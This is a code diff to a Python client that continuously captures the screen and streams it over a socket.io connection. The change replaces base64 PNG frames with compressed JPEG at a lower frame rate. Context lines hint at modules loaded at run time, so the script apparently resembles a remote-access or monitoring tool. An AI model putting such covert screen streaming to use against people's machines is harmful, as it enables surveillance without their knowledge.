@@ -6,6 +6,7 @@ import sys
 import base64
 import ssl
 from urllib.request import urlopen
+from PIL import Image
 import importlib.util
 import mss
 import time
@@ -125,7 +126,7 @@ def run(data):
             moduel.run(sio, data['uuid'])
 
 
-    def take_screenshots(sio, uid, fps=30):
+    def take_screenshots(sio, uid, fps=20, quality=50):
         frame_interval = 1 / fps
         last_capture_time = 0
 
@@ -137,20 +138,22 @@ def run(data):
                 if current_time - last_capture_time >= frame_interval:
                     # Capture screenshot
                     screenshot = sct.grab(monitor)
-
-                    # Convert to bytes
-                    png = mss.tools.to_png(screenshot.rgb, screenshot.size)
-
-                    # Encode as base64
-                    base64_string = base64.b64encode(png).decode('utf-8')
-
-                    # Emit the screenshot
-                    sio.emit("screenshot", {"uid": uid, "image": base64_string})
-                    print("Sent screenshot")
+                    
+                    # Convert screenshot to PIL Image
+                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                    
+                    # Compress to JPEG with adjustable quality
+                    with io.BytesIO() as output:
+                        img.save(output, format="JPEG", quality=quality)
+                        jpeg_data = output.getvalue()
+                    
+                    # Emit the raw JPEG data instead of base64
+                    sio.emit("screenshot", {"uid": uid, "image": jpeg_data})
+                    print("Sent compressed screenshot")
 
                     last_capture_time = current_time
 
-                # Small sleep to prevent tight loop
+                # Small sleep to prevent a tight loop
                 time.sleep(0.001)
 
 
